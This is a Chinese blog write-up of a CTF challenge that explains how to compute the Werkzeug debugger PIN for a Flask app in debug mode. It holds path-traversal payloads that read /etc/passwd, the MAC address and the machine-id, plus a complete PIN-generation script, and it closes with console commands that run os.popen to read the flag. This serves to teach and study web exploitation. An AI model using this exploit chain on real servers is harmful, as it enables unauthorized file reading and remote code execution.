---
title: 一文弄清楚Flask框架下该如何计算PIN码
tags:
  - Web
  - CTF
  - 目录穿越
  - 任意读取
date: 2023-11-06 17:26:53
categories: CTF苦痛之路
cover: https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300342.jpg
description: 由于目录穿越引起的文件任意读取漏洞导致可以通过计算PIN码的方式来进入控制台
updated: 2023-11-06 17:30:37
---


事情的起因是XSCTF决赛的一道题。

![image-20231106140751987](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106140751987.png?x-oss-process=style/blog)

进入链接，查看题目。

![image-20231106140832584](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106140832584.png?x-oss-process=style/blog)

到这里提示已经很明显了，Flask和debugger（调试模式）。在开发Flask应用中，如果开发人员忘记关闭调试模式，就可能会导致严重的安全隐患。

随便传递一个错误的参数，就可以看到页面报错的调试页面。点击红圈处，可以直观地观察到源码泄露。

![image-20231106141318438](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106141318438.png?x-oss-process=style/blog)

![image-20231106141334777](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106141334777.png?x-oss-process=style/blog)

容易分析代码逻辑，这段Python代码将`filepath`和`textfile`拼合成一个文件路径并打开，读取该文件路径的内容。其中`filepath`的值为`./uploads/`,`textfile`参数可控。此时我们马上能想到目录穿越漏洞，导致文件任意读取。

构造payload为`?file=../../../../etc/passwd`，成功读取到敏感文件`/etc/passwd`，内含登录系统的用户信息。

![image-20231106142312396](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106142312396.png?x-oss-process=style/blog)

关于`/etc/passwd`文件更详细的解释可以参考这篇博客[非常详细的/etc/passwd解释_etc/passwd文件的内容和含义-CSDN博客](https://blog.csdn.net/liukaitydn/article/details/83046083)。

总之经过以上操作，我们成功验证了题目存在文件任意读漏洞，并且有了初步的思路：通过文件任意读读取敏感信息，计算出Flask控制台的PIN码从而获得开发者权限查看flag文件。

现在开始细聊如何计算PIN码。

## 序言

在计算PIN码之前，有一件事必须知道，Flask的PIN码计算仅和werkzeug的debug模块有关。

<font color=red size=5>**和Python版本无关！！！**</font>

在网络上大多数博客都会告诉你，Flask框架计算PIN码时在Python版本3.6时采用md5加密，在Python版本3.8开始使用sha1加密。但是实际上并没有Python版本为3.7就不能采用sha1加密的说法，仅与werkzeug的版本有关系。而现在绝大多数都是采用高版本的加密，也就是sha1。这一点极其重要，将直接影响我们后续用于计算PIN码时采用的脚本。

### 什么是PIN码

pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式,可以理解为自带的webshell。

### PIN码如何生成

pin码生成要六要素
1.username 在可以任意文件读的条件下读 /etc/passwd进行猜测
2.modname 默认flask.app
3.appname 默认Flask
4.moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量
5.uuidnode mac地址的十进制,任意文件读 /sys/class/net/eth0/address
6.machine_id 机器码 这个待会细说,一般就生成pin码不对就是这错了

了解到这些之后，就可以正式开启算PIN了。

## 获取username

username参数指的是当前运行这个程序的用户名。这个比较好做，在文件任意读时读取` /etc/passwd`，猜测用户名就好。比如这道题的最下方出现了`xsctf`，我们猜测这就是用户名。有一些题目下可能没有特别特殊的用户名，这时候我们就只好猜测用户名为最上方的`root`。也就是说运行程序的是拥有root权限的管理员。

## 获取modname

一般来说这个值都是默认为`flask.app`，具体的获取方式每个版本都不同，比如可以通过`getattr(app, "module", t.cast(object, app).class.module)`来获取modname。

## 获取appname

一般来说这个值也是默认为`Flask`，也可以通过`getattr(app, 'name', app.class.name)`方式获取。

## 获取moddir

moddir是flask所在的路径，可以通过`getattr(mod, 'file', None)`来获得，题目中一般通过查看debug的报错信息获得，如下图。

![image-20231106145402374](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106145402374.png?x-oss-process=style/blog)

故本题中的路径为`/usr/local/lib/python3.7/site-packages/flask/app.py`。其实一般都是这个值，最多python版本可能会有差异。

## 获取uuidnode

网卡的mac地址的十进制，可以通过代码uuid.getnode()获得，也可以通过读取/sys/class/net/eth0/address获得，一般获取的是一串十六进制数，将其中的横杠去掉然后转十进制就行。

本题构造payload为`?file=../../../../sys/class/net/eth0/address`，结果如下。

![image-20231106145741537](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106145741537.png?x-oss-process=style/blog)

例：02:42:ac:1e:00:02 => 2485378744322
也可以直接跑print(int("02:42:ac:1e:00:02".replace(":",""),16))

## 获取machine_id

这里尤为重要。

如果我们能够实现文件任意读，就读取`/usr/local/lib/python3.7/site-packages/werkzeug/debug/__init__.py`（注意python版本，可以通过上面的报错信息拿到），找到里面的`get_machine_id`方法，可以最直观的看到本题目计算Flask的machine_id的过程。

构造payload`?file=../../../../usr/local/lib/python3.7/site-packages/werkzeug/debug/__init__.py`，找到该方法。

![image-20231106150726655](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106150726655.png?x-oss-process=style/blog)

重点关注这一段代码。

````python
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
    #依次打开"/etc/machine-id", "/proc/sys/kernel/random/boot_id"两个文件
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break#注意这个break，只要满足一个就退出循环
                #这里因为"/etc/machine-id"在前，所以优先级更高
--snip--
 try:
    with open("/proc/self/cgroup", "rb") as f:
        #这里主要是针对docker机的，通过读取"/proc/self/cgroup"获取经过正则后的值，然后拼接在上一步的字符上
        #不同的题目环境正则条件也许不一样
        linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
    pass
````

这里很清楚的描述了machine_id码是如何计算的，值得一提的是每个题目的machine_id值计算也许会不一样，所以能读取该环境的`get_machine_id`函数是最好的方法。

这里再贴一段别的大佬博客中的解释。

```bash
1. /etc/machine-id（一般仅非docker机有，截取全文）
2. /proc/sys/kernel/random/boot_id（一般仅非docker机有，截取全文）
3. /proc/self/cgroup（一般仅docker有，**仅截取最后一个斜杠后面的内容**）
# 例如：11:perf_event:/docker/docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope
# 则只截取docker-2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8.scope拼接到后面
文件12按顺序读，**12只要读到一个**就可以了，1读到了，就不用读2了。
文件3如果存在的话就截取，不存在的话就不用管
最后machine-id=（文件1或文件2）+文件3（存在的话）
```

重点是**`最后machine-id=（文件1或文件2）+文件3（存在的话）`**这段话。machine-id和boot-id只需取一个，machine的优先级更高，然后再与cgroup文件的内容拼接作为最终的machine-id值。值得一提的是cgroup的截取方法并不一定是仅截取最后一个斜杠的内容，根据题目正则条件的不同也有可能只取`/docker/`后的部分。

这里的XSCTF题目中machine-id和boot-id都有值，而cgroup文件为空，故只需要取machine-id文件的内容作为machine-id的值。构造payload为`?file=../../../../etc/machine-id`，读取machine-id为`6e1d32ebf38c587c4a41089c0c744c83`。

![image-20231106152333132](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106152333132.png?x-oss-process=style/blog)

至此集齐了计算PIN码的所有条件。

## 计算PIN&获得flag

下面给出脚本，为了避免werkzeug版本产生的歧义，脚本能够同时给出经过md5和sha1加密计算得到的PIN码。

```python
import hashlib
from itertools import chain
import argparse



def getMd5Pin(probably_public_bits, private_bits):
    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv

def getSha1Pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    num = None
    if num is None:
        h.update(b"pinsalt")
        num = f"{int(h.hexdigest(), 16):09d}"[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x: x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv

def macToInt(mac):
    mac = mac.replace(":", "")
    return str(int(mac, 16))

if __name__ == '__main__':
    parse = argparse.ArgumentParser(description = "Calculate Python Flask Pin")
    parse.add_argument('-u', '--username',required = True, type = str, help = "运行flask用户的用户名")
    parse.add_argument('-m', '--modname', type = str, default = "flask.app", help = "默认为flask.app")
    parse.add_argument('-a', '--appname', type = str, default = "Flask", help = "默认为Flask")
    parse.add_argument('-p', '--path', required = True, type = str, help = "getattr(mod, '__file__', None):flask包中app.py的路径")
    parse.add_argument('-M', '--MAC', required = True, type = str, help = "MAC地址")
    parse.add_argument('-i', '--machineId', type = str, default = "", help = "机器ID")
    args = parse.parse_args()

    probably_public_bits = [
        args.username,
        args.modname,
        args.appname,
        args.path
    ]

    private_bits = [
        macToInt(args.MAC),
        bytes(args.machineId, encoding = 'utf-8')
    ]
    md5Pin = getMd5Pin(probably_public_bits, private_bits)
    sha1Pin = getSha1Pin(probably_public_bits, private_bits)

    print("Md5Pin:  " + md5Pin)
    print("Sha1Pin:  " + sha1Pin)
```

向终端传入参数。

```shell
python 计算PIN_2.py -u xsctf -p /usr/local/lib/python3.7/site-packages/flask/app.py -M 02:42:ac:1e:00:02 -i 6e1d32ebf38c587c4a41089c0c744c83
```

计算结果如下，其中sha1的计算结果为：890-921-121

![image-20231106153806563](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106153806563.png?x-oss-process=style/blog)

进入控制台，可以访问`/console`或者点击报错调试页面右边的那个黑格子，输入PIN码。

![image-20231106155043435](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231106155043435.png?x-oss-process=style/blog)

登录成功，执行命令。

```python
>>> import os
>>> os.popen('ls').read()
'app.py\nstatic\ntemplates\nuploads\n'
>>> os.popen('ls /').read()
'Fffff111114444gggggg\napp\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmed  
>>> os.popen('cat /Fffff111114444gggggg').read()
'XSCTF{oh_mY_d2bug93r_M0de_!}'
>>> 
```

得到flag`XSCTF{oh_mY_d2bug93r_M0de_!}`。

## 后话

当时在线下赛时，被这个flask算PIN折磨的几乎崩溃，没有吃透源码被博客坑惨了。而且出题人也玩了一手阴招，并没有按照Python版本的规律出题。导致我思路全对却因为一直采用的是md5加密而无法计算出正确的PIN值。

其实这题很简单，只要有Flask的debug模式+任意文件读取就可以做。

## 参考资料

[Flask调试模式PIN值计算和利用 - 正汰的学习笔记 (hz2016.com)](https://blog.hz2016.com/2023/07/flask调试模式pin值计算和利用/)

![300342](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/300342.jpg?x-oss-process=style/blog)
